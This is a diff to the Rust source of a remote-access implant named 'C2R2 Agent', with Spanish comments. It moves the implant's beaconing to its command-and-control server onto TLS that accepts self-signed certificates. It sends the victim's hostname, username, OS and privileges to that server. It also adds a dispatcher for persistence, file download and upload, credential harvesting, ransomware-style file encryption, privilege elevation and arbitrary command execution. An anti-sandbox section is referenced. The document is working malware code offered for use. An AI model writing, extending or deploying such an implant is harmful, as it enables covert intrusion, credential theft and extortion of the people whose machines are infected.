@@ -21,16 +21,20 @@ mod syscalls;
 mod persistence;
 mod beacon;
 mod argfuscator;
+mod tls_config;
 
 #[cfg(target_os = "windows")]
 use std::ffi::CStr;
-use std::io::{BufRead, BufReader, Write, ErrorKind};
+use std::io::{BufRead, BufReader, Write, ErrorKind, Read};
 use std::net::TcpStream;
 use std::process::Command;
 use std::thread;
 use std::time::Duration;
 use std::fs;
 use std::path::Path;
+use std::sync::Arc;
+
+use rustls::ClientConfig;
 
 const DELIMITER: &str = "\n<<END>>\n";
 
@@ -69,8 +73,14 @@ fn configure_tcp_keepalive(stream: &TcpStream) -> std::io::Result<()> {
     Ok(())
 }
 
+/// Crea la configuración TLS para el cliente
+/// Acepta certificados auto-firmados (necesario para C2)
+fn create_tls_config() -> Arc<ClientConfig> {
+    Arc::new(tls_config::create_client_config())
+}
+
 fn main() {
-    debug_print!("DEBUG: C2R2 Agent v2.0 - Beacon Mode");
+    debug_print!("DEBUG: C2R2 Agent v2.0 - Beacon Mode (TLS)");
     
     // ============================================================================
     // ANTI-SANDBOX CHECKS (Production Mode Only)
@@ -86,41 +96,64 @@ fn main() {
         }
     }
     
-    debug_print!("DEBUG: Conectando a {}", config::C2_SERVER);
+    debug_print!("DEBUG: Conectando (TLS) a {}", config::C2_SERVER);
+    
+    // Crear configuración TLS
+    let tls_config = create_tls_config();
     
     // Configuración de beacon (60s con 30% jitter por defecto)
     let beacon_config = beacon::BeaconConfig::default();
     let mut retry_count = 0;
     
     loop {
+        // Extraer host y puerto del servidor
+        let (host, _port) = match config::C2_SERVER.rsplit_once(':') {
+            Some((h, p)) => (h, p),
+            None => {
+                debug_print!("DEBUG: Formato de servidor inválido: {}", config::C2_SERVER);
+                thread::sleep(Duration::from_secs(5));
+                continue;
+            }
+        };
+        
         match TcpStream::connect(config::C2_SERVER) {
-            Ok(mut stream) => {
-                debug_print!("DEBUG: Conectado al servidor C2");
+            Ok(tcp_stream) => {
+                debug_print!("DEBUG: Conexión TCP establecida");
                 
                 // Configurar TCP keepalive para mantener la conexión viva
-                // Esto previene que routers/firewalls cierren conexiones idle
-                if let Err(e) = configure_tcp_keepalive(&stream) {
+                if let Err(e) = configure_tcp_keepalive(&tcp_stream) {
                     debug_print!("DEBUG: Warning - No se pudo configurar TCP keepalive: {}", e);
                 }
                 
-                // Configurar timeouts para evitar cuelgues indefinidos
-                let read_timeout = Duration::from_secs(300); // 5 minutos
-                let write_timeout = Duration::from_secs(30);  // 30 segundos
+                // Crear conexión TLS
+                let server_name = match rustls::pki_types::ServerName::try_from(host.to_string()) {
+                    Ok(name) => name,
+                    Err(e) => {
+                        debug_print!("DEBUG: Error creando ServerName: {}", e);
+                        // Intentar con "localhost" como fallback
+                        match rustls::pki_types::ServerName::try_from("localhost".to_string()) {
+                            Ok(name) => name,
+                            Err(_) => continue,
+                        }
+                    }
+                };
                 
-                if let Err(e) = stream.set_read_timeout(Some(read_timeout)) {
-                    debug_print!("DEBUG: Warning - No se pudo configurar read timeout: {}", e);
-                }
+                let tls_conn = match rustls::ClientConnection::new(tls_config.clone(), server_name) {
+                    Ok(conn) => conn,
+                    Err(e) => {
+                        debug_print!("DEBUG: Error creando conexión TLS: {}", e);
+                        continue;
+                    }
+                };
                 
-                if let Err(e) = stream.set_write_timeout(Some(write_timeout)) {
-                    debug_print!("DEBUG: Warning - No se pudo configurar write timeout: {}", e);
-                }
+                debug_print!("DEBUG: Iniciando conexión TLS...");
                 
                 retry_count = 0; // Reset retry counter on successful connection
-                handle_connection(stream, &beacon_config);
-                debug_print!("DEBUG: Conexión cerrada");
+                handle_tls_connection(tcp_stream, tls_conn, &beacon_config);
+                debug_print!("DEBUG: Conexión TLS cerrada");
             }
             Err(e) => {
-                debug_print!("DEBUG: Error de conexión: {}", e);
+                debug_print!("DEBUG: Error de conexión TCP: {}", e);
             }
         }
         
@@ -132,6 +165,201 @@ fn main() {
     }
 }
 
+/// Wrapper para manejar lectura/escritura TLS de forma más sencilla
+/// Posee tanto el TcpStream como la conexión TLS
+struct TlsStreamWrapper {
+    tcp_stream: TcpStream,
+    tls_conn: rustls::ClientConnection,
+}
+
+impl TlsStreamWrapper {
+    fn new(tcp_stream: TcpStream, tls_conn: rustls::ClientConnection) -> Self {
+        Self { tcp_stream, tls_conn }
+    }
+    
+    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
+        let mut stream = rustls::Stream::new(&mut self.tls_conn, &mut self.tcp_stream);
+        stream.read(buf)
+    }
+    
+    fn write_all(&mut self, buf: &[u8]) -> std::io::Result<()> {
+        let mut stream = rustls::Stream::new(&mut self.tls_conn, &mut self.tcp_stream);
+        stream.write_all(buf)
+    }
+    
+    fn flush(&mut self) -> std::io::Result<()> {
+        let mut stream = rustls::Stream::new(&mut self.tls_conn, &mut self.tcp_stream);
+        stream.flush()
+    }
+    
+    fn set_read_timeout(&self, dur: Option<Duration>) -> std::io::Result<()> {
+        self.tcp_stream.set_read_timeout(dur)
+    }
+    
+    fn set_write_timeout(&self, dur: Option<Duration>) -> std::io::Result<()> {
+        self.tcp_stream.set_write_timeout(dur)
+    }
+}
+
+fn handle_tls_connection(tcp_stream: TcpStream, tls_conn: rustls::ClientConnection, _beacon_config: &beacon::BeaconConfig) {
+    let mut tls_wrapper = TlsStreamWrapper::new(tcp_stream, tls_conn);
+    
+    // Configurar timeouts
+    let read_timeout = Duration::from_secs(300); // 5 minutos
+    let write_timeout = Duration::from_secs(30);  // 30 segundos
+    
+    if let Err(e) = tls_wrapper.set_read_timeout(Some(read_timeout)) {
+        debug_print!("DEBUG: Warning - No se pudo configurar read timeout: {}", e);
+    }
+    
+    if let Err(e) = tls_wrapper.set_write_timeout(Some(write_timeout)) {
+        debug_print!("DEBUG: Warning - No se pudo configurar write timeout: {}", e);
+    }
+    
+    // Enviar información del sistema
+    if !send_sysinfo_tls(&mut tls_wrapper) {
+        debug_print!("DEBUG: Error enviando información del sistema");
+        return;
+    }
+
+    // Buffer para lectura línea por línea
+    let mut read_buffer = vec![0u8; 4096];
+    let mut line_buffer = String::new();
+    
+    loop {
+        // Leer datos del stream TLS
+        match tls_wrapper.read(&mut read_buffer) {
+            Ok(0) => {
+                debug_print!("DEBUG: Conexión cerrada por el servidor");
+                break;
+            }
+            Ok(n) => {
+                let data = String::from_utf8_lossy(&read_buffer[..n]);
+                line_buffer.push_str(&data);
+                
+                // Procesar líneas completas
+                while let Some(pos) = line_buffer.find('\n') {
+                    let line = line_buffer[..pos].to_string();
+                    line_buffer = line_buffer[pos + 1..].to_string();
+                    
+                    let command = line.trim();
+                    if command.is_empty() {
+                        continue;
+                    }
+                    
+                    debug_print!("DEBUG: Comando recibido: {}", command);
+                    
+                    // Procesar comando
+                    let response = process_command(command);
+                    if !response.is_empty() {
+                        if !send_response_tls(&mut tls_wrapper, &response) {
+                            debug_print!("DEBUG: Error enviando respuesta");
+                            return;
+                        }
+                    }
+                }
+            }
+            Err(e) => {
+                if e.kind() == ErrorKind::TimedOut || e.kind() == ErrorKind::WouldBlock {
+                    debug_print!("DEBUG: Read timeout, continuando...");
+                    continue;
+                }
+                debug_print!("DEBUG: Error de lectura TLS: {}", e);
+                break;
+            }
+        }
+    }
+}
+
+fn send_response_tls(tls_wrapper: &mut TlsStreamWrapper, response: &str) -> bool {
+    if let Err(e) = tls_wrapper.write_all(response.as_bytes()) {
+        debug_print!("DEBUG: Error escribiendo respuesta: {}", e);
+        return false;
+    }
+    
+    if let Err(e) = tls_wrapper.flush() {
+        debug_print!("DEBUG: Error flush respuesta: {}", e);
+        return false;
+    }
+    
+    true
+}
+
+fn send_sysinfo_tls(tls_wrapper: &mut TlsStreamWrapper) -> bool {
+    debug_print!("DEBUG: Recopilando información del sistema...");
+    
+    let hostname = get_system_info("hostname");
+    let username = get_system_info("username");
+    let os = get_system_info("os");
+    let privileges = get_system_info("privileges");
+    
+    let sysinfo = format!(
+        "__SYSINFO__:hostname:{}\n__SYSINFO__:username:{}\n__SYSINFO__:os:{}\n__SYSINFO__:privileges:{}\n",
+        hostname, username, os, privileges
+    );
+    
+    debug_print!("DEBUG: Enviando información del sistema...");
+    
+    if let Err(e) = tls_wrapper.write_all(sysinfo.as_bytes()) {
+        debug_print!("DEBUG: Error escribiendo sysinfo: {}", e);
+        return false;
+    }
+    
+    if let Err(e) = tls_wrapper.flush() {
+        debug_print!("DEBUG: Error flush sysinfo: {}", e);
+        return false;
+    }
+    
+    debug_print!("DEBUG: Información enviada exitosamente");
+    true
+}
+
+/// Procesa un comando recibido y retorna la respuesta
+fn process_command(command: &str) -> String {
+    if command.starts_with("__PERSIST__:") {
+        let method = command.strip_prefix("__PERSIST__:").unwrap_or("");
+        debug_print!("DEBUG: Estableciendo persistencia: {}", method);
+        handle_persistence(method)
+    } else if command == "__PERSIST_REMOVE__" {
+        debug_print!("DEBUG: Removiendo persistencia");
+        handle_persistence_remove()
+    } else if command.starts_with("__BEACON__:") {
+        let config_str = command.strip_prefix("__BEACON__:").unwrap_or("");
+        debug_print!("DEBUG: Cambiando configuración beacon: {}", config_str);
+        format!("__INFO__:Configuración de beacon recibida (se aplicará en próxima reconexión): {}{}", config_str, DELIMITER)
+    } else if command.starts_with("__DOWNLOAD__:") {
+        let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
+        debug_print!("DEBUG: Descargando archivo: {}", path);
+        download_file(path)
+    } else if command.starts_with("__UPLOAD__|") {
+        debug_print!("DEBUG: Procesando upload...");
+        upload_file(command)
+    } else if command == "__HARVEST__" {
+        debug_print!("DEBUG: Harvesting credenciales...");
+        harvest_credentials()
+    } else if command.starts_with("__ENCRYPT__:") {
+        let params = command.strip_prefix("__ENCRYPT__:").unwrap_or("");
+        debug_print!("DEBUG: Encrypting files: {}", params);
+        encrypt_files(params)
+    } else if command.starts_with("__DECRYPT__:") {
+        let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
+        debug_print!("DEBUG: Decrypting files: {}", params);
+        decrypt_files(params)
+    } else if command == "__ELEVATE__" {
+        debug_print!("DEBUG: Re-executing agent with admin privileges...");
+        elevate_agent()
+    } else if !command.is_empty() {
+        let output = execute_command(command);
+        format!("{}{}", output, DELIMITER)
+    } else {
+        String::new()
+    }
+}
+
+// Legacy functions for non-TLS connections (kept for backwards compatibility reference)
+// These are not used when TLS is enabled, but are kept in case TLS needs to be disabled
+
+#[allow(dead_code)]
 fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
     // Try to clone the stream, return early if it fails
     let reader_stream = match stream.try_clone() {
@@ -259,8 +487,9 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
     }
 }
 
-/// Helper function to send a response to the C2 server
+/// Helper function to send a response to the C2 server (legacy, non-TLS)
 /// Returns false if the connection is broken (write or flush failed)
+#[allow(dead_code)]
 fn send_response(writer: &mut TcpStream, response: &str) -> bool {
     if let Err(e) = writer.write_all(response.as_bytes()) {
         debug_print!("DEBUG: Error escribiendo respuesta: {}", e);
@@ -275,6 +504,8 @@ fn send_response(writer: &mut TcpStream, response: &str) -> bool {
     true
 }
 
+/// Legacy non-TLS sysinfo sender (kept for reference)
+#[allow(dead_code)]
 fn send_sysinfo(writer: &mut TcpStream) -> bool {
     debug_print!("DEBUG: Recopilando información del sistema...");
     
